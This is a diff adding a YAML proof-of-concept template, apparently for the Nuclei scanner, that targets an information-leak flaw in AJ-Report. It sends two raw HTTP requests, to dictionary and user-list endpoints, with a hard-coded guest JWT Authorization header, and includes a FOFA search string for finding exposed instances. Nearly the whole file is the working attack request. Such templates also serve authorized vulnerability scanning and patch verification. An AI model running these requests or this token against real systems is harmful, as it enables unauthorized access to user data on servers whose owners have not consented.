@@ -1,0 +1,84 @@
+id: poc-du2bex83fo7ogh46
+info:
+  name: AJ-Report-showMoreSearch信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/du2bex83fo7ogh46
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: du2bex83fo7ogh46
+    fofa: title="AJ-Report"
+http:
+- raw:
+  - 'GET /gaeaDict/all HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: sidebarStatus=0
+
+    Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+
+    Accept: application/json, text/plain, */*
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjoiMjY5NWU2M2M4ZTI5NGUwYWE5YmI0ZWFjMTlkNmYwZGQiLCJ0ZW5hbnQiOiJ0ZW5hbnRDb2RlIiwidXNlcm5hbWUiOiJndWVzdCJ9.5JSofjFh7AlhkQjsH7JM-Q02k2imQe52IS7q78ONpdM
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /accessUser/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: sidebarStatus=0
+
+    Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+
+    Accept: application/json, text/plain, */*
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjoiMjY5NWU2M2M4ZTI5NGUwYWE5YmI0ZWFjMTlkNmYwZGQiLCJ0ZW5hbnQiOiJ0ZW5hbnRDb2RlIiwidXNlcm5hbWUiOiJndWVzdCJ9.5JSofjFh7AlhkQjsH7JM-Q02k2imQe52IS7q78ONpdM
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
